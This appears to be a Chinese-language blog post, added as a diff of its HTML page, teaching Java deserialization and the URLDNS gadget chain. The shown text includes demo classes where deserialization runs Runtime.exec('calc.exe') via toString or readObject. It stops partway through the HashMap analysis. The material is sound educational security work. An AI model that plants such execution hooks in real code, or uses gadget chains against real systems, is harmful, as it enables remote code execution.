@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zifeiyu-sec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="文章介绍Java反序列化原理及安全风险，分析了HashMap+URL的DNSLog利用链，简单了解Fastjson反序列化机制与典型漏洞利用流程，包括远程命令执行的攻击方式和防御建议。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化及利用链">
+<meta property="og:url" content="http://zifeiyu-sec.github.io/2025/09/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/Java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
+<meta property="og:site_name" content="子非鱼的博客">
+<meta property="og:description" content="文章介绍Java反序列化原理及安全风险，分析了HashMap+URL的DNSLog利用链，简单了解Fastjson反序列化机制与典型漏洞利用流程，包括远程命令执行的攻击方式和防御建议。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250904150359750.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250904150639842.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250904150826023-1756969708891-1.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250904152145593.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250904152233921.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250904152638836.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250912174645209.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250912174951406.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250912175035433.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250912180635067.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250912180713276.png">
+<meta property="og:image" content="http://zifeiyu-sec.github.io/images/image-20250912181638200.png">
+<meta property="article:published_time" content="2025-09-12T16:20:44.000Z">
+<meta property="article:modified_time" content="2025-09-12T16:40:29.620Z">
+<meta property="article:author" content="子非鱼">
+<meta property="article:tag" content="Java安全开发">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zifeiyu-sec.github.io/images/image-20250904150359750.png">
+
+
+<link rel="canonical" href="http://zifeiyu-sec.github.io/2025/09/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/Java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%88%A9%E7%94%A8%E9%93%BE/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://zifeiyu-sec.github.io/2025/09/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/Java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%88%A9%E7%94%A8%E9%93%BE/","path":"2025/09/13/安全开发/Java/反序列化及利用链/","title":"反序列化及利用链"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>反序列化及利用链 | 子非鱼的博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">子非鱼的博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在时间的尺度上，一切问题都有答案</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UrlDns%E9%93%BE"><span class="nav-number">2.</span> <span class="nav-text">UrlDns链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E9%93%BE"><span class="nav-number">2.1.</span> <span class="nav-text">分析链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B%E6%A6%82%E8%A7%88"><span class="nav-number">2.1.1.</span> <span class="nav-text">整体流程概览</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E9%93%BE"><span class="nav-number">2.2.</span> <span class="nav-text">构造链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">整体架构分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">2.4.</span> <span class="nav-text">详细技术原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E8%BD%BD%E8%8D%B7%E7%94%9F%E6%88%90%E9%98%B6%E6%AE%B5-UrlDnsChain"><span class="nav-number">2.4.1.</span> <span class="nav-text">1. 载荷生成阶段 (UrlDnsChain)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E9%98%B6%E6%AE%B5-UnSerializableDemo"><span class="nav-number">2.4.2.</span> <span class="nav-text">2. 漏洞触发阶段 (UnSerializableDemo)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E7%BB%86%E8%B0%83%E7%94%A8%E9%93%BE%EF%BC%9A"><span class="nav-number">2.4.2.1.</span> <span class="nav-text">反序列化详细调用链：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E8%A6%81%E7%82%B9%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90"><span class="nav-number">2.5.</span> <span class="nav-text">技术要点深度解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E4%B8%AA%E9%93%BE%E6%9C%89%E6%95%88%EF%BC%9F"><span class="nav-number">2.5.1.</span> <span class="nav-text">为什么这个链有效？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E6%93%8D%E4%BD%9C%E7%9A%84%E7%B2%BE%E5%A6%99%E4%B9%8B%E5%A4%84"><span class="nav-number">2.5.2.</span> <span class="nav-text">反射操作的精妙之处</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%89%B9%E5%BE%81%EF%BC%9A"><span class="nav-number">2.5.3.</span> <span class="nav-text">攻击特征：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">2.6.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%EF%BC%9A"><span class="nav-number">2.6.1.</span> <span class="nav-text">代码层面：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2%EF%BC%9A"><span class="nav-number">2.6.2.</span> <span class="nav-text">架构层面：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.</span> <span class="nav-text">Fastjson反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#FastJson%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.1.</span> <span class="nav-text">FastJson介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">3.2.</span> <span class="nav-text">代码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pom-xml%E4%B8%AD%E6%B7%BB%E5%8A%A0"><span class="nav-number">3.2.1.</span> <span class="nav-text">pom.xml中添加</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BAUser-java"><span class="nav-number">3.2.2.</span> <span class="nav-text">创建User.java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">3.2.3.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1"><span class="nav-number">3.2.4.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WriteClassName"><span class="nav-number">3.2.5.</span> <span class="nav-text">WriteClassName</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E6%80%BB%E7%BB%93"><span class="nav-number">3.3.1.</span> <span class="nav-text">利用链总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">3.3.2.</span> <span class="nav-text">攻击流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">3.3.3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80"><span class="nav-number">3.3.3.1.</span> <span class="nav-text">一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C"><span class="nav-number">3.3.3.2.</span> <span class="nav-text">二</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="子非鱼"
+      src="/images/1.png">
+  <p class="site-author-name" itemprop="name">子非鱼</p>
+  <div class="site-description" itemprop="description">学习过程的记录</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zifeiyu-sec" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/zifeiyu-sec" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;zifeiyu-sec" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://example.com/" title="https:&#x2F;&#x2F;example.com" rel="noopener" target="_blank">Title</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zifeiyu-sec.github.io/2025/09/13/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/Java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%88%A9%E7%94%A8%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.png">
+      <meta itemprop="name" content="子非鱼">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="子非鱼的博客">
+      <meta itemprop="description" content="学习过程的记录">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="反序列化及利用链 | 子非鱼的博客">
+      <meta itemprop="description" content="文章介绍Java反序列化原理及安全风险，分析了HashMap+URL的DNSLog利用链，简单了解Fastjson反序列化机制与典型漏洞利用流程，包括远程命令执行的攻击方式和防御建议。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          反序列化及利用链
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-09-13 00:20:44 / 修改时间：00:40:29" itemprop="dateCreated datePublished" datetime="2025-09-13T00:20:44+08:00">2025-09-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" itemprop="url" rel="index"><span itemprop="name">安全开发</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">文章介绍Java反序列化原理及安全风险，分析了HashMap+URL的DNSLog利用链，简单了解Fastjson反序列化机制与典型漏洞利用流程，包括远程命令执行的攻击方式和防御建议。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>创建类User</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> UnserializationDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> sex;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">int</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, sex=&quot;</span> + sex +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注意：要被序列化的类需要实现接口Serializable</span></span><br></pre></td></tr></table></figure>
+
+<p>序列化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> UnserializationDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">18</span>, <span class="number">1</span>);</span><br><span class="line">        SerializationDemo(user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SerializationDemo</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;sertest.txt&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运行后在根目录生成一个sertest.txt的文件，就是序列化后的文件</span></span><br></pre></td></tr></table></figure>
+
+<p>反序列化类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> UnserializationDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnSerializableDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Object obj= UnSerializationDemo(<span class="string">&quot;sertest.txt&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UnSerializationDemo</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;sertest.txt&quot;</span>));</span><br><span class="line">        User user=(User)objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为在User类中有toString方法，当我们输出对象的时候，默认调用了这个方法，所以反序列化后输出，在控制台输出<code>User&#123;name=&#39;张三&#39;, age=18, sex=1&#125;</code>,</p>
+<p>如果此时在这个方法中有危险方法执行，比如添加</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后重新序列化并且反序列化，在反序列化的时候就会弹出计算器</p>
+<p>还有一种情况就是在User中有readObject方法</p>
+<p>当Java反序列化机制遇到一个实现了Serializable接口的类时，它会检查该类是否有自定义的readObject方法：</p>
+<ul>
+<li>如果有且符合规范（private、正确参数、正确异常声明），反序列化机制会自动调用这个方法</li>
+<li>如果没有或不符合规范，则只执行默认的反序列化逻辑</li>
+</ul>
+<p>所以在User中添加</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化&quot;</span>);</span><br><span class="line">        <span class="comment">// 执行默认的反序列化逻辑</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化反序列化后会自动调用readObject从而输出反序列化</p>
+<p>此时如果在readObject中自定义了其他危险函数，就会触发安全问题</p>
+<h1 id="UrlDns链"><a href="#UrlDns链" class="headerlink" title="UrlDns链"></a>UrlDns链</h1><h2 id="分析链"><a href="#分析链" class="headerlink" title="分析链"></a>分析链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ConstractChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDnsChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入HashMap.java中，反序列化会默认调用readObject，查看HashMap.java，有readObject，</p>
+<p><img src="/./images/image-20250904150359750.png" alt="image-20250904150359750"></p>
+<p>所以当我们序列化这个类，然后反序列化，就会执行readObject，</p>
+<p>查看readObbject是否有可利用的位置</p>
+<p>发现</p>
+<p><img src="/./images/image-20250904150639842.png" alt="image-20250904150639842"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>查看putVal</p>
+<p><img src="/./images/image-20250904150826023-1756969708891-1.png" alt="image-20250904150826023"></p>
+<p>查看hash，点进去</p>
+<p>看到</p>
